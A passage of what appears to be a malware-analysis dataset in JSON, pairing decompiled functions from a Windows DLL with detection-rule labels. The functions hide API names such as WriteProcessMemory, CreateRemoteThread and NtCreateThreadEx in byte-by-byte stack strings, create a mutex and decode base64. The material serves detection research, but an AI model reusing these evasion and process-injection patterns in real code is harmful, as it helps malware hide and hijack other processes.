0x78;\n    uStack876 = 0x57;\n    uStack875 = 0;\n    uStack728 = 0x52;\n    uStack727 = 0x65;\n    uStack726 = 0x67;\n    uStack725 = 0x43;\n    uStack724 = 0x72;\n    uStack723 = 0x65;\n    uStack722 = 0x61;\n    uStack721 = 0x74;\n    uStack720 = 0x65;\n    uStack719 = 0x4b;\n    uStack718 = 0x65;\n    uStack717 = 0x79;\n    uStack716 = 0x45;\n    uStack715 = 0x78;\n    uStack714 = 0x57;\n    uStack713 = 0;\n    uStack840 = 0x52;\n    uStack839 = 0x65;\n    uStack838 = 0x67;\n    uStack837 = 0x53;\n    uStack836 = 0x65;\n    uStack835 = 0x74;\n    uStack834 = 0x56;\n    uStack833 = 0x61;\n    uStack832 = 0x6c;\n    uStack831 = 0x75;\n    uStack830 = 0x65;\n    uStack829 = 0x45;\n    uStack828 = 0x78;\n    uStack827 = 0x57;\n    uStack826 = 0;\n    uStack584 = 0x52;\n    uStack583 = 0x65;\n    uStack582 = 0x67;\n    uStack581 = 0x51;\n    uStack580 = 0x75;\n    uStack579 = 0x65;\n    uStack578 = 0x72;\n    uStack577 = 0x79;\n    uStack576 = 0x56;\n    uStack575 = 0x61;\n    uStack574 = 0x6c;\n    uStack573 = 0x75;\n    uStack572 = 0x65;\n    uStack571 = 0x45;\n    uStack570 = 0x78;\n    uStack569 = 0x57;\n    uStack568 = 0;\n    uStack1000 = 0x52;\n    uStack999 = 0x65;\n    uStack998 = 0x67;\n    uStack997 = 0x43;\n    uStack996 = 0x6c;\n    uStack995 = 0x6f;\n    uStack994 = 0x73;\n    uStack993 = 0x65;\n    uStack992 = 0x4b;\n    uStack991 = 0x65;\n    uStack990 = 0x79;\n    uStack989 = 0;\n    uStack144 = 0x43;\n    uStack143 = 0x72;\n    uStack142 = 0x65;\n    uStack141 = 0x61;\n    uStack140 = 0x74;\n    uStack139 = 0x65;\n    uStack138 = 0x54;\n    uStack137 = 0x6f;\n    uStack136 = 0x6f;\n    uStack135 = 0x6c;\n    uStack134 = 0x68;\n    uStack133 = 0x65;\n    uStack132 = 0x6c;\n    uStack131 = 0x70;\n    uStack130 = 0x33;\n    uStack129 = 0x32;\n    uStack128 = 0x53;\n    uStack127 = 0x6e;\n    uStack126 = 0x61;\n    uStack125 = 0x70;\n    uStack124 = 0x73;\n    uStack123 = 0x68;\n    uStack122 = 0x6f;\n    uStack121 = 0x74;\n    uStack120 = 0;\n    uStack824 = 0x50;\n    uStack823 = 0x72;\n    uStack822 = 0x6f;\n    uStack821 = 99;\n    uStack820 = 0x65;\n    uStack819 = 0x73;\n    uStack818 = 0x73;\n    uStack817 = 0x33;\n    uStack816 = 0x32;\n    uStack815 = 0x4e;\n    uStack814 = 0x65;\n    uStack813 = 0x78;\n    uStack812 = 0x74;\n    uStack811 = 0x57;\n    uStack810 = 0;\n    uStack712 = 0x50;\n    uStack711 = 0x72;\n    uStack710 = 0x6f;\n    uStack709 = 99;\n    uStack708 = 0x65;\n    uStack707 = 0x73;\n    uStack706 = 0x73;\n    uStack705 = 0x33;\n    uStack704 = 0x32;\n    uStack703 = 0x46;\n    uStack702 = 0x69;\n    uStack701 = 0x72;\n    uStack700 = 0x73;\n    uStack699 = 0x74;\n    uStack698 = 0x57;\n    uStack697 = 0;\n    uStack808 = 0x56;\n    uStack807 = 0x69;\n    uStack806 = 0x72;\n    uStack805 = 0x74;\n    uStack804 = 0x75;\n    uStack803 = 0x61;\n    uStack802 = 0x6c;\n    uStack801 = 0x41;\n    uStack800 = 0x6c;\n    uStack799 = 0x6c;\n    uStack798 = 0x6f;\n    uStack797 = 99;\n    uStack796 = 0x45;\n    uStack795 = 0x78;\n    uStack794 = 0;\n    uStack368 = 0x47;\n    uStack367 = 0x65;\n    uStack366 = 0x74;\n    uStack365 = 0x43;\n    uStack364 = 0x75;\n    uStack363 = 0x72;\n    uStack362 = 0x72;\n    uStack361 = 0x65;\n    uStack360 = 0x6e;\n    uStack359 = 0x74;\n    uStack358 = 0x50;\n    uStack357 = 0x72;\n    uStack356 = 0x6f;\n    uStack355 = 99;\n    uStack354 = 0x65;\n    uStack353 = 0x73;\n    uStack352 = 0x73;\n    uStack351 = 0x49;\n    uStack350 = 100;\n    uStack349 = 0;\n    uStack440 = 0x57;\n    uStack439 = 0x72;\n    uStack438 = 0x69;\n    uStack437 = 0x74;\n    uStack436 = 0x65;\n    uStack435 = 0x50;\n    uStack434 = 0x72;\n    uStack433 = 0x6f;\n    uStack432 = 99;\n    uStack431 = 0x65;\n    uStack430 = 0x73;\n    uStack429 = 0x73;\n    uStack428 = 0x4d;\n    uStack427 = 0x65;\n    uStack426 = 0x6d;\n    uStack425 = 0x6f;\n    uStack424 = 0x72;\n    uStack423 = 0x79;\n    uStack422 = 0;\n    uStack464 = 0x43;\n    uStack463 = 0x72;\n    uStack462 = 0x65;\n    uStack461 = 0x61;\n    uStack460 = 0x74;\n    uStack459 = 0x65;\n    uStack458 = 0x52;\n    uStack457 = 0x65;\n    uStack456 = 0x6d;\n    uStack455 = 0x6f;\n    uStack454 = 0x74;\n    uStack453 = 0x65;\n    uStack452 = 0x54;\n    uStack451 = 0x68;\n    uStack450 = 0x72;\n    uStack449 = 0x65;\n    uStack448 = 0x61;\n    uStack447 = 100;\n    uStack446 = 0;\n    uStack344 = 0x43;\n    uStack343 = 0x72;\n    uStack342 = 0x65;\n    uStack341 = 0x61;\n    uStack340 = 0x74;\n    uStack339 = 0x65;\n    uStack338 = 0x52;\n    uStack337 = 0x65;\n    uStack336 = 0x6d;\n    uStack335 = 0x6f;\n    uStack334 = 0x74;\n    uStack333 = 0x65;\n    uStack332 = 0x54;\n    uStack331 = 0x68;\n    uStack330 = 0x72;\n    uStack329 = 0x65;\n    uStack328 = 0x61;\n    uStack327 = 100;\n    uStack326 = 0x45;\n    uStack325 = 0x78;\n    uStack324 = 0;\n    uStack320 = 0x50;\n    uStack319 = 0x72;\n    uStack318 = 0x6f;\n    uStack317 = 99;\n    uStack316 = 0x65;\n    uStack315 = 0x73;\n    uStack314 = 0x73;\n    uStack313 = 0x49;\n    uStack312 = 100;\n    uStack311 = 0x54;\n    uStack310 = 0x6f;\n    uStack309 = 0x53;\n    uStack308 = 0x65;\n    uStack307 = 0x73;\n    uStack306 = 0x73;\n    uStack305 = 0x69;\n    uStack304 = 0x6f;\n    uStack303 = 0x6e;\n    uStack302 = 0x49;\n    uStack301 = 100;\n    uStack300 = 0;\n    uStack560 = 0x54;\n    uStack559 = 0x65;\n    uStack558 = 0x72;\n    uStack557 = 0x6d;\n    uStack556 = 0x69;\n    uStack555 = 0x6e;\n    uStack554 = 0x61;\n    uStack553 = 0x74;\n    uStack552 = 0x65;\n    uStack551 = 0x50;\n    uStack550 = 0x72;\n    uStack549 = 0x6f;\n    uStack548 = 99;\n    uStack547 = 0x65;\n    uStack546 = 0x73;\n    uStack545 = 0x73;\n    uStack544 = 0;\n    uStack696 = 0x47;\n    uStack695 = 0x65;\n    uStack694 = 0x74;\n    uStack693 = 0x50;\n    uStack692 = 0x72;\n    uStack691 = 0x6f;\n    uStack690 = 99;\n    uStack689 = 0x65;\n    uStack688 = 0x73;\n    uStack687 = 0x73;\n    uStack686 = 0x54;\n    uStack685 = 0x69;\n    uStack684 = 0x6d;\n    uStack683 = 0x65;\n    uStack682 = 0x73;\n    uStack681 = 0;\n    uStack792 = 0x43;\n    uStack791 = 0x72;\n    uStack790 = 0x65;\n    uStack789 = 0x61;\n    uStack788 = 0x74;\n    uStack787 = 0x65;\n    uStack786 = 0x50;\n    uStack785 = 0x72;\n    uStack784 = 0x6f;\n    uStack783 = 99;\n    uStack782 = 0x65;\n    uStack781 = 0x73;\n    uStack780 = 0x73;\n    uStack779 = 0x57;\n    uStack778 = 0;\n    uStack536 = 0x47;\n    uStack535 = 0x65;\n    uStack534 = 0x74;\n    uStack533 = 0x4d;\n    uStack532 = 0x6f;\n    uStack531 = 100;\n    uStack530 = 0x75;\n    uStack529 = 0x6c;\n    uStack528 = 0x65;\n    uStack527 = 0x48;\n    uStack526 = 0x61;\n    uStack525 = 0x6e;\n    uStack524 = 100;\n    uStack523 = 0x6c;\n    uStack522 = 0x65;\n    uStack521 = 0x57;\n    uStack520 = 0;\n    uStack984 = 0x4f;\n    uStack983 = 0x70;\n    uStack982 = 0x65;\n    uStack981 = 0x6e;\n    uStack980 = 0x50;\n    uStack979 = 0x72;\n    uStack978 = 0x6f;\n    uStack977 = 99;\n    uStack976 = 0x65;\n    uStack975 = 0x73;\n    uStack974 = 0x73;\n    uStack973 = 0;\n    uStack968 = 0x43;\n    uStack967 = 0x72;\n    uStack966 = 0x65;\n    uStack965 = 0x61;\n    uStack964 = 0x74;\n    uStack963 = 0x65;\n    uStack962 = 0x46;\n    uStack961 = 0x69;\n    uStack960 = 0x6c;\n    uStack959 = 0x65;\n    uStack958 = 0x57;\n    uStack957 = 0;\n    uStack1144 = 0x52;\n    uStack1143 = 0x65;\n    uStack1142 = 0x61;\n    uStack1141 = 100;\n    uStack1140 = 0x46;\n    uStack1139 = 0x69;\n    uStack1138 = 0x6c;\n    uStack1137 = 0x65;\n    uStack1136 = 0;\n    uStack1096 = 0x57;\n    uStack1095 = 0x72;\n    uStack1094 = 0x69;\n    uStack1093 = 0x74;\n    uStack1092 = 0x65;\n    uStack1091 = 0x46;\n    uStack1090 = 0x69;\n    uStack1089 = 0x6c;\n    uStack1088 = 0x65;\n    uStack1087 = 0;\n    uStack776 = 0x43;\n    uStack775 = 0x72;\n    uStack774 = 0x65;\n    uStack773 = 0x61;\n    uStack772 = 0x74;\n    uStack771 = 0x65;\n    uStack770 = 0x50;\n    uStack769 = 0x72;\n    uStack768 = 0x6f;\n    uStack767 = 99;\n    uStack766 = 0x65;\n    uStack765 = 0x73;\n    uStack764 = 0x73;\n    uStack763 = 0x41;\n    uStack762 = 0;\n    uStack1064 = 0x43;\n    uStack1063 = 0x72;\n    uStack1062 = 0x65;\n    uStack1061 = 0x61;\n    uStack1060 = 0x74;\n    uStack1059 = 0x65;\n    uStack1058 = 0x50;\n    uStack1057 = 0x69;\n    uStack1056 = 0x70;\n    uStack1055 = 0x65;\n    uStack1054 = 0;\n    uStack952 = 0x47;\n    uStack951 = 0x65;\n    uStack950 = 0x74;\n    uStack949 = 0x46;\n    uStack948 = 0x69;\n    uStack947 = 0x6c;\n    uStack946 = 0x65;\n    uStack945 = 0x53;\n    uStack944 = 0x69;\n    uStack943 = 0x7a;\n    uStack942 = 0x65;\n    uStack941 = 0;\n    uStack224 = 0x57;\n    uStack223 = 0x61;\n    uStack222 = 0x69;\n    uStack221 = 0x74;\n    uStack220 = 0x46;\n    uStack219 = 0x6f;\n    uStack218 = 0x72;\n    uStack217 = 0x53;\n    uStack216 = 0x69;\n    uStack215 = 0x6e;\n    uStack214 = 0x67;\n    uStack213 = 0x6c;\n    uStack212 = 0x65;\n    uStack211 = 0x4f;\n    uStack210 = 0x62;\n    uStack209 = 0x6a;\n    uStack208 = 0x65;\n    uStack207 = 99;\n    uStack206 = 0x74;\n    uStack205 = 0x45;\n    uStack204 = 0x78;\n    uStack203 = 0;\n    uStack296 = 0x53;\n    uStack295 = 0x65;\n    uStack294 = 0x74;\n    uStack293 = 0x48;\n    uStack292 = 0x61;\n    uStack291 = 0x6e;\n    uStack290 = 100;\n    uStack289 = 0x6c;\n    uStack288 = 0x65;\n    uStack287 = 0x49;\n    uStack286 = 0x6e;\n    uStack285 = 0x66;\n    uStack284 = 0x6f;\n    uStack283 = 0x72;\n    uStack282 = 0x6d;\n    uStack281 = 0x61;\n    uStack280 = 0x74;\n    uStack279 = 0x69;\n    uStack278 = 0x6f;\n    uStack277 = 0x6e;\n    uStack276 = 0;\n    uStack272 = 0x47;\n    uStack271 = 0x65;\n    uStack270 = 0x74;\n    uStack269 = 0x43;\n    uStack268 = 0x75;\n    uStack267 = 0x72;\n    uStack266 = 0x72;\n    uStack265 = 0x65;\n    uStack264 = 0x6e;\n    uStack263 = 0x74;\n    uStack262 = 0x44;\n    uStack261 = 0x69;\n    uStack260 = 0x72;\n    uStack259 = 0x65;\n    uStack258 = 99;\n    uStack257 = 0x74;\n    uStack256 = 0x6f;\n    uStack255 = 0x72;\n    uStack254 = 0x79;\n    uStack253 = 0x41;\n    uStack252 = 0;\n    uStack200 = 0x53;\n    uStack199 = 0x48;\n    uStack198 = 0x47;\n    uStack197 = 0x65;\n    uStack196 = 0x74;\n    uStack195 = 0x53;\n    uStack194 = 0x70;\n    uStack193 = 0x65;\n    uStack192 = 99;\n    uStack191 = 0x69;\n    uStack190 = 0x61;\n    uStack189 = 0x6c;\n    uStack188 = 0x46;\n    uStack187 = 0x6f;\n    uStack186 = 0x6c;\n    uStack185 = 100;\n    uStack184 = 0x65;\n    uStack183 = 0x72;\n    uStack182 = 0x50;\n    uStack181 = 0x61;\n    uStack180 = 0x74;\n    uStack179 = 0x68;\n    uStack178 = 0x57;\n    uStack177 = 0;\n    uStack872 = 0x53;\n    uStack871 = 0x68;\n    uStack870 = 0x65;\n    uStack869 = 0x6c;\n    uStack868 = 0x6c;\n    uStack867 = 0x45;\n    uStack866 = 0x78;\n    uStack865 = 0x65;\n    uStack864 = 99;\n    uStack863 = 0x75;\n    uStack862 = 0x74;\n    uStack861 = 0x65;\n    uStack860 = 0x57;\n    uStack859 = 0;\n    uStack856 = 0x53;\n    uStack855 = 0x68;\n    uStack854 = 0x65;\n    uStack853 = 0x6c;\n    uStack852 = 0x6c;\n    uStack851 = 0x45;\n    uStack850 = 0x78;\n    uStack849 = 0x65;\n    uStack848 = 99;\n    uStack847 = 0x75;\n    uStack846 = 0x74;\n    uStack845 = 0x65;\n    uStack844 = 0x41;\n    uStack843 = 0;\n    uStack80 = 0x47;\n    uStack79 = 0x65;\n    uStack78 = 0x74;\n    uStack77 = 0x4d;\n    uStack76 = 0x6f;\n    uStack75 = 100;\n    uStack74 = 0x75;\n    uStack73 = 0x6c;\n    uStack72 = 0x65;\n    uStack71 = 0x49;\n    uStack70 = 0x6e;\n    uStack69 = 0x66;\n    uStack68 = 0x6f;\n    uStack67 = 0x72;\n    uStack66 = 0x6d;\n    uStack65 = 0x61;\n    uStack64 = 0x74;\n    uStack63 = 0x69;\n    uStack62 = 0x6f;\n    uStack61 = 0x6e;\n    uStack60 = 0;\n    uStack248 = 0x4e;\n    uStack247 = 0x74;\n    uStack246 = 0x57;\n    uStack245 = 0x72;\n    uStack244 = 0x69;\n    uStack243 = 0x74;\n    uStack242 = 0x65;\n    uStack241 = 0x56;\n    uStack240 = 0x69;\n    uStack239 = 0x72;\n    uStack238 = 0x74;\n    uStack237 = 0x75;\n    uStack236 = 0x61;\n    uStack235 = 0x6c;\n    uStack234 = 0x4d;\n    uStack233 = 0x65;\n    uStack232 = 0x6d;\n    uStack231 = 0x6f;\n    uStack230 = 0x72;\n    uStack229 = 0x79;\n    uStack228 = 0;\n    uStack512 = 0x4e;\n    uStack511 = 0x74;\n    uStack510 = 0x43;\n    uStack509 = 0x72;\n    uStack508 = 0x65;\n    uStack507 = 0x61;\n    uStack506 = 0x74;\n    uStack505 = 0x65;\n    uStack504 = 0x54;\n    uStack503 = 0x68;\n    uStack502 = 0x72;\n    uStack501 = 0x65;\n    uStack500 = 0x61;\n    uStack499 = 100;\n    uStack498 = 0x45;\n    uStack497 = 0x78;\n    uStack496 = 0;\n    *0x18002cdd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack760);\n    *0x18002cd10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack112);\n    *0x18002cd18 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack680);\n    *0x18002cda8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack176);\n    *0x18002cd30 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack488);\n    *0x18002ce48 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack904);\n    *0x18002cd08 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack656);\n    *0x18002cdb0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack416);\n    *0x18002ce30 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack632);\n    *0x18002cde8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack608);\n    *0x18002cd80 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack392);\n    *0x18002ce08 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, &uStack744);\n    *0x18002ce18 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack56, &uStack888);\n    *0x18002cd00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack56, &uStack728);\n    *0x18002cdc0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack56, &uStack840);\n    *0x18002cd68 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack56, &uStack584);\n    *0x18002cd50 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack56, &uStack1000);\n    *0x18002ce28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack144);\n    *0x18002cde0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack824);\n    *0x18002cd28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack712);\n    *0x18002cd90 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack808);\n    *0x18002cd20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack440);\n    *0x18002cda0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack464);\n    *0x18002cdc8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack344);\n    *0x18002cd70 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack320);\n    *0x18002cd58 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack560);\n    *0x18002ce58 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack696);\n    *0x18002cd48 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack792);\n    *0x18002cdf8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack536);\n    *0x18002cd98 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack368);\n    *0x18002ce50 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack984);\n    *0x18002ce60 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack968);\n    *0x18002ce00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack1064);\n    *0x18002cd40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack1144);\n    *0x18002cd78 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack1096);\n    *0x18002cdd8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack952);\n    *0x18002cdf0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack776);\n    *0x18002cdb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack224);\n    *0x18002cd38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack296);\n    *0x18002ce20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, &uStack272);\n    *0x18002ce40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack48, &uStack200);\n    *0x18002ce10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack48, &uStack872);\n    *0x18002cd88 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack48, &uStack856);\n    *0x18002cd60 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack40, &uStack248);\n    *0x18002ce38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack40, &uStack512);\n    return 1;\n}\n",
        "token_count": 15846
    },
    "1800064b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nulong fcn.1800064b0(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack83;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    \n    uStack88 = 100;\n    uStack87 = 0x61;\n    uStack86 = 0x39;\n    uStack85 = 0x66;\n    uStack84 = 0x30;\n    uStack83 = 0x65;\n    uStack82 = 0x37;\n    uStack81 = 100;\n    uStack80 = 99;\n    uStack79 = 0x36;\n    uStack78 = 99;\n    uStack77 = 0x35;\n    uStack76 = 0x32;\n    uStack75 = 0x30;\n    uStack74 = 0x34;\n    uStack73 = 0x34;\n    uStack72 = 0x66;\n    uStack71 = 0x61;\n    uStack70 = 0x32;\n    uStack69 = 0x39;\n    uStack68 = 0x62;\n    uStack67 = 0x65;\n    uStack66 = 0x61;\n    uStack65 = 0x35;\n    uStack64 = 0x33;\n    uStack63 = 0x33;\n    uStack62 = 0x37;\n    uStack61 = 0x62;\n    uStack60 = 0x34;\n    uStack59 = 0x37;\n    uStack58 = 0x39;\n    uStack57 = 0x32;\n    uStack56 = 0x62;\n    uStack55 = 0x38;\n    uStack54 = 0x62;\n    uStack53 = 0x38;\n    uStack52 = 0x37;\n    uStack51 = 0x33;\n    uStack50 = 0x33;\n    uStack49 = 0x37;\n    uStack48 = 0x33;\n    uStack47 = 0x62;\n    uStack46 = 0x61;\n    uStack45 = 0x39;\n    uStack44 = 0x39;\n    uStack43 = 0x61;\n    uStack42 = 100;\n    uStack41 = 0x38;\n    uStack40 = 0x31;\n    uStack39 = 0x36;\n    uStack38 = 100;\n    uStack37 = 0x35;\n    uStack36 = 99;\n    uStack35 = 0x39;\n    uStack34 = 0x66;\n    uStack33 = 0x35;\n    uStack32 = 0x66;\n    uStack31 = 0x32;\n    uStack30 = 0x37;\n    uStack29 = 0x35;\n    uStack28 = 0x66;\n    uStack27 = 0x30;\n    uStack26 = 0x33;\n    uStack25 = 0x66;\n    uStack24 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 1, &uStack88);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar2 == 0) || (iVar1 == 0xb7)) {\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 1176
    },
    "18000389": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.180003890(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uchar *puVar5;\n    uint8_t *puVar6;\n    int32_t iStack72;\n    uint8_t auStack68 [4];\n    int32_t iStack64;\n    char acStack60 [4];\n    int32_t iStack56;\n    int32_t iStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uchar auStack40 [40];\n    \n    uStack48 = 0;\n    iStack52 = fcn.180006e40(arg2);\n    iStack72 = 0;\n    iStack64 = 0;\n    iStack56 = 0;\n    fcn.180006d40(auStack40);\n    while( true ) {\n        iVar1 = iStack52;\n        iStack44 = iStack52;\n        iStack52 = iStack52 + -1;\n        if ((iVar1 == 0) || (pcVar4 = fcn.180006e50(arg2, iStack56),  *pcVar4 == '=')) break;\n        puVar5 = fcn.180006e50(arg2, iStack56);\n        cVar2 = fcn.180003840(*puVar5);\n        if (cVar2 == '\\0') break;\n        puVar6 = fcn.180006e50(arg2, iStack56);\n        auStack68[iStack72] = *puVar6;\n        iStack72 = iStack72 + 1;\n        iStack56 = iStack56 + 1;\n        if (iStack72 == 4) {\n            for (iStack72 = 0; iStack72 < 4; iStack72 = iStack72 + 1) {\n                uVar3 = fcn.180006e00(0x18002cf48, auStack68[iStack72], 0);\n                auStack68[iStack72] = uVar3;\n            }\n            acStack60[0] = ((auStack68[1] & 0x30) >> 4) + auStack68[0] * '\\x04';\n            acStack60[1] = ((auStack68[1] & 0xf) << 4) + ((auStack68[2] & 0x3c) >> 2);\n            acStack60[2] = ((auStack68[2] & 3) << 6) + auStack68[3];\n            for (iStack72 = 0; iStack72 < 3; iStack72 = iStack72 + 1) {\n                fcn.180006a60(auStack40, acStack60 + iStack72);\n            }\n            iStack72 = 0;\n        }\n    }\n    if (iStack72 != 0) {\n        for (iStack64 = iStack72; iStack64 < 4; iStack64 = iStack64 + 1) {\n            auStack68[iStack64] = 0;\n        }\n        for (iStack64 = 0; iStack64 < 4; iStack64 = iStack64 + 1) {\n            uVar3 = fcn.180006e00(0x18002cf48, auStack68[iStack64], 0);\n            auStack68[iStack64] = uVar3;\n        }\n        acStack60[0] = ((auStack68[1] & 0x30) >> 4) + auStack68[0] * '\\x04';\n        acStack60[1] = ((auStack68[1] & 0xf) << 4) + ((auStack68[2] & 0x3c) >> 2);\n        acStack60[2] = ((auStack68[2] & 3) << 6) + auStack68[3];\n        for (iStack64 = 0; iStack64 < iStack72 + -1; iStack64 = iStack64 + 1) {\n            fcn.180006a60(auStack40, acStack60 + iStack64);\n        }\n    }\n    fcn.180006c40(arg1, auStack40);\n    uStack48 = uStack48 | 1;\n    fcn.180006bc0(auStack40);\n    return arg1;\n}\n",
        "token_count": 977
    },
    "180003e9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.180003e90(uchar *arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint32_t auStack312 [2];\n    uint32_t *puStack304;\n    uchar *puStack296;\n    uchar auStack280 [264];\n    \n    puStack296 = fcn.180003e40(arg2);\n    auStack312[0] = 0x40;\n    puStack304 = auStack312;\n    fcn.180003c00(auStack280, arg3, puStack304);\n    auStack312[0] = arg2;\n    fcn.180003d00(auStack280, arg1, puStack304, puStack296);\n    for (uVar1 = arg2; uVar1 != 0; uVar1 = uVar1 - 1) {\n        *arg1 = *puStack296;\n        puStack296 = puStack296 + 1;\n        arg1 = arg1 + 1;\n    }\n    return 1;\n}\n",
        "token_count": 228
    },
    "18000869": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.180008690(ulong arg1, ulong arg2, ulong arg3, ushort *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack2248;\n    uint uStack2244;\n    uchar *puStack2240;\n    uchar *puStack2232;\n    uint auStack2216 [2];\n    uchar auStack2208 [16];\n    ulong uStack2192;\n    uint uStack2184;\n    ushort uStack2180;\n    ulong uStack2144;\n    uint uStack2136;\n    uchar auStack2104 [2096];\n    \n    uStack2244 = 0;\n    puStack2240 = NULL;\n    puVar3 = auStack2104;\n    for (iVar2 = 0x824; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uStack2248 = 0x824;\n    iVar1 = (**0x18002cda8)(arg1, auStack2104, &uStack2248, 0x3e000000);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar1 == 0x7a) {\n            return uStack2244;\n        }\n        puStack2232 = fcn.180010a14(uStack2248);\n        iVar1 = (**0x18002cda8)(arg1, auStack2104, &uStack2248, 0x3e000000);\n        if (iVar1 == 0) {\n            return uStack2244;\n        }\n        puStack2240 = puStack2232;\n    }\n    else {\n        puStack2240 = auStack2104;\n    }\n    auStack2216[0] = 0x68;\n    puVar3 = auStack2208;\n    for (iVar2 = 0x60; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uStack2184 = 0x824;\n    uStack2136 = 0x824;\n    uStack2192 = arg2;\n    uStack2144 = arg3;\n    iVar1 = (**0x18002cd30)(puStack2240, 0, 0, auStack2216);\n    if (iVar1 != 0) {\n        *arg4 = uStack2180;\n        